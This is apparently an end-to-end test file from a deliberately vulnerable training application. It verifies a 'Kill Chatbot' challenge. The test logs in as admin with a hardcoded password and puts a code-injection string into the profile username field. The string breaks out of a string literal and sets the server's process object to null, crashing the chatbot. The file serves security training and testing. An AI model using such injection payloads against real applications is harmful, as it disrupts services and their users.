/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')

describe('/chatbot', () => {
  let username, submitButton, messageBox
  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  describe('challenge "killChatbot"', () => {
    it('should be possible to kill the chatbot by setting the process to null', () => {
      browser.waitForAngularEnabled(false)
      browser.get(protractor.basePath + '/profile')
      username = element(by.id('username'))
      submitButton = element(by.id('submit'))
      username.sendKeys('admin"); process=null; usersusers.addUser("1337", "test')
      submitButton.click()
      browser.get(protractor.basePath + '/#/chatbot')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
      messageBox = element(by.id('message-input'))
      messageBox.sendKeys('hi')
      messageBox.sendKeys(protractor.Key.ENTER)
      browser.driver.sleep(5000)
      protractor.expect.challengeSolved({ challenge: 'Kill Chatbot' })
    })
  })
})
